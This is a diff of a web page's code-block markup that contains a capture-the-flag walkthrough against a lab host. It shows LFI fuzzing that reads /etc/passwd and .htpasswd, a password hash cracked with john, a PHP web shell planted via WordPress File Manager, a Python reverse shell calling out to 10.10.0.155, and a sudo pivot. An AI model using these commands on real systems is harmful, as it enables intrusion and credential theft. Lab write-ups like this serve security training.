@@ -232,71 +232,71 @@ gobuster dir -k -u https://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-me
 /forum (Status: 301)
 /wordpress (Status: 301)
 </code></pre><p>Exploring the /forum, we find possible file inclusion link and indeed: https://172.31.3.1/forum/chatlogs/chatlogs.php?file=../../../../../../../etc/passwd</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz --hh<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1095</span> -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt https://172.31.3.1/forum/chatlogs/chatlogs.php<span style="color:#f1fa8c">\?</span>file<span style="color:#f1fa8c">\=</span>FUZZ
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ID Response Lines Word Chars Payload</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>000000114: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">254</span> L <span style="color:#bd93f9">1177</span> W <span style="color:#bd93f9">8311</span> Ch <span style="color:#f1fa8c">&#34;/etc/apache2/apache2.conf&#34;</span>
-</span></span><span style="display:flex;"><span>000000128: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">37</span> L <span style="color:#bd93f9">139</span> W <span style="color:#bd93f9">1569</span> Ch <span style="color:#f1fa8c">&#34;/etc/fstab&#34;</span>
-</span></span><span style="display:flex;"><span>000000131: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">82</span> L <span style="color:#bd93f9">118</span> W <span style="color:#bd93f9">1825</span> Ch <span style="color:#f1fa8c">&#34;/etc/group&#34;</span>
-</span></span><span style="display:flex;"><span>000000198: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">36</span> L <span style="color:#bd93f9">88</span> W <span style="color:#bd93f9">1316</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts&#34;</span>
-</span></span><span style="display:flex;"><span>000000201: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">37</span> L <span style="color:#bd93f9">120</span> W <span style="color:#bd93f9">1506</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts.allow&#34;</span>
-</span></span><span style="display:flex;"><span>000000202: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">44</span> L <span style="color:#bd93f9">174</span> W <span style="color:#bd93f9">1806</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts.deny&#34;</span>
-</span></span><span style="display:flex;"><span>000000229: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">382</span> L <span style="color:#bd93f9">1113</span> W <span style="color:#bd93f9">9276</span> Ch <span style="color:#f1fa8c">&#34;/etc/init.d/apache2&#34;</span>
-</span></span><span style="display:flex;"><span>000000230: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">29</span> L <span style="color:#bd93f9">68</span> W <span style="color:#bd93f9">1121</span> Ch <span style="color:#f1fa8c">&#34;/etc/issue&#34;</span>
-</span></span><span style="display:flex;"><span>000000241: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">50</span> L <span style="color:#bd93f9">198</span> W <span style="color:#bd93f9">1964</span> Ch <span style="color:#f1fa8c">&#34;/etc/mysql/my.cnf&#34;</span>
-</span></span><span style="display:flex;"><span>000000243: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">47</span> L <span style="color:#bd93f9">126</span> W <span style="color:#bd93f9">1608</span> Ch <span style="color:#f1fa8c">&#34;/etc/nsswitch.conf&#34;</span>
-</span></span><span style="display:flex;"><span>000000250: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">59</span> L <span style="color:#bd93f9">105</span> W <span style="color:#bd93f9">2766</span> Ch <span style="color:#f1fa8c">&#34;/etc/passwd&#34;</span>
-</span></span><span style="display:flex;"><span>000000371: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">150</span> L <span style="color:#bd93f9">461</span> W <span style="color:#bd93f9">4386</span> Ch <span style="color:#f1fa8c">&#34;/etc/ssh/sshd_config&#34;</span>
-</span></span><span style="display:flex;"><span>000000376: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">31</span> L <span style="color:#bd93f9">108</span> W <span style="color:#bd93f9">1498</span> Ch <span style="color:#f1fa8c">&#34;/etc/updatedb.conf&#34;</span>
-</span></span><span style="display:flex;"><span>000000394: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">28</span> L <span style="color:#bd93f9">64</span> W <span style="color:#bd93f9">1140</span> Ch <span style="color:#f1fa8c">&#34;../.htpasswd&#34;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz --hh<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1095</span> -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt https://172.31.3.1/forum/chatlogs/chatlogs.php<span style="color:#f1fa8c">\?</span>file<span style="color:#f1fa8c">\=</span>FUZZ
+
+<span style="color:#6272a4"># ID Response Lines Word Chars Payload</span>
+
+000000114: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">254</span> L <span style="color:#bd93f9">1177</span> W <span style="color:#bd93f9">8311</span> Ch <span style="color:#f1fa8c">&#34;/etc/apache2/apache2.conf&#34;</span>
+000000128: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">37</span> L <span style="color:#bd93f9">139</span> W <span style="color:#bd93f9">1569</span> Ch <span style="color:#f1fa8c">&#34;/etc/fstab&#34;</span>
+000000131: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">82</span> L <span style="color:#bd93f9">118</span> W <span style="color:#bd93f9">1825</span> Ch <span style="color:#f1fa8c">&#34;/etc/group&#34;</span>
+000000198: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">36</span> L <span style="color:#bd93f9">88</span> W <span style="color:#bd93f9">1316</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts&#34;</span>
+000000201: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">37</span> L <span style="color:#bd93f9">120</span> W <span style="color:#bd93f9">1506</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts.allow&#34;</span>
+000000202: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">44</span> L <span style="color:#bd93f9">174</span> W <span style="color:#bd93f9">1806</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts.deny&#34;</span>
+000000229: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">382</span> L <span style="color:#bd93f9">1113</span> W <span style="color:#bd93f9">9276</span> Ch <span style="color:#f1fa8c">&#34;/etc/init.d/apache2&#34;</span>
+000000230: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">29</span> L <span style="color:#bd93f9">68</span> W <span style="color:#bd93f9">1121</span> Ch <span style="color:#f1fa8c">&#34;/etc/issue&#34;</span>
+000000241: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">50</span> L <span style="color:#bd93f9">198</span> W <span style="color:#bd93f9">1964</span> Ch <span style="color:#f1fa8c">&#34;/etc/mysql/my.cnf&#34;</span>
+000000243: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">47</span> L <span style="color:#bd93f9">126</span> W <span style="color:#bd93f9">1608</span> Ch <span style="color:#f1fa8c">&#34;/etc/nsswitch.conf&#34;</span>
+000000250: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">59</span> L <span style="color:#bd93f9">105</span> W <span style="color:#bd93f9">2766</span> Ch <span style="color:#f1fa8c">&#34;/etc/passwd&#34;</span>
+000000371: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">150</span> L <span style="color:#bd93f9">461</span> W <span style="color:#bd93f9">4386</span> Ch <span style="color:#f1fa8c">&#34;/etc/ssh/sshd_config&#34;</span>
+000000376: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">31</span> L <span style="color:#bd93f9">108</span> W <span style="color:#bd93f9">1498</span> Ch <span style="color:#f1fa8c">&#34;/etc/updatedb.conf&#34;</span>
+000000394: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">28</span> L <span style="color:#bd93f9">64</span> W <span style="color:#bd93f9">1140</span> Ch <span style="color:#f1fa8c">&#34;../.htpasswd&#34;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>content of <code>../.htpasswd</code> is a hash <code>dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/</code> we can bruteforce</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt --rules <span style="color:#8be9fd;font-style:italic">hash</span>
-</span></span><span style="display:flex;"><span>/opt/john/run/john --show <span style="color:#8be9fd;font-style:italic">hash</span>
-</span></span><span style="display:flex;"><span>dwight:cowboys1
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt --rules <span style="color:#8be9fd;font-style:italic">hash</span>
+/opt/john/run/john --show <span style="color:#8be9fd;font-style:italic">hash</span>
+dwight:cowboys1
+</code></pre></td></tr></table>
 </div>
 </div><p>We can try to login the wordpress admin interface, but it requires to edit /etc/hosts, adding:
 <code>172.31.3.1 office.csl</code></p>
 <p>In <a href="http://office.csl/wp-admin">http://office.csl/wp-admin</a> , we find WP File Manager that we can use to create <code>reverse.php</code> file:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php <span style="color:#ff79c6">echo</span> system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;cmd&#34;</span>]); <span style="color:#ff79c6">?&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php <span style="color:#ff79c6">echo</span> system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;cmd&#34;</span>]); <span style="color:#ff79c6">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>We can refer to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> to get a reverseshell</p>
 <pre><code>http://office.csl/reverse.php?cmd=whoami
@@ -304,285 +304,285 @@ gobuster dir -k -u https://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-me
 http://office.csl/reverse.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.155&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 <p>We obtain a reverse shell:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#bd93f9">1337</span>
-</span></span><span style="display:flex;"><span>Connection from 172.31.3.1:54978
-</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">pwd</span>
-</span></span><span style="display:flex;"><span>/var/www/html/wordpress
-</span></span><span style="display:flex;"><span>$ whoami
-</span></span><span style="display:flex;"><span>www-data
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lnvp <span style="color:#bd93f9">1337</span>
+Connection from 172.31.3.1:54978
+$ <span style="color:#8be9fd;font-style:italic">pwd</span>
+/var/www/html/wordpress
+$ whoami
+www-data
+</code></pre></td></tr></table>
 </div>
 </div><p>We can pivot to dwight user:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls /home
-</span></span><span style="display:flex;"><span>dwight
-</span></span><span style="display:flex;"><span>ryan
-</span></span><span style="display:flex;"><span>$ ls /home/dwight
-</span></span><span style="display:flex;"><span>access.txt
-</span></span><span style="display:flex;"><span>$ cat /home/dwight/access.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
-</span></span><span style="display:flex;"><span>$ ls -la /home/dwight/.ssh
-</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">8</span>
-</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#bd93f9">2</span> dwight dwight <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">8</span> <span style="color:#bd93f9">2020</span> .
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#bd93f9">4</span> dwight dwight <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">8</span> <span style="color:#bd93f9">2020</span> ..
-</span></span><span style="display:flex;"><span>$ sudo -l
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> www-data on office:
-</span></span><span style="display:flex;"><span>env_reset, mail_badpass,
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User www-data may run the following commands on office:
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">(</span>dwight<span style="color:#ff79c6">)</span> NOPASSWD: /bin/bash
-</span></span><span style="display:flex;"><span>$ sudo -u dwight /bin/bash
-</span></span><span style="display:flex;"><span>whoami
-</span></span><span style="display:flex;"><span>dwight
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls /home
+dwight
+ryan
+$ ls /home/dwight
+access.txt
+$ cat /home/dwight/access.txt
+<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
+$ ls -la /home/dwight/.ssh
+total <span style="color:#bd93f9">8</span>
+drwxrwxr-x <span style="color:#bd93f9">2</span> dwight dwight <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">8</span> <span style="color:#bd93f9">2020</span> .
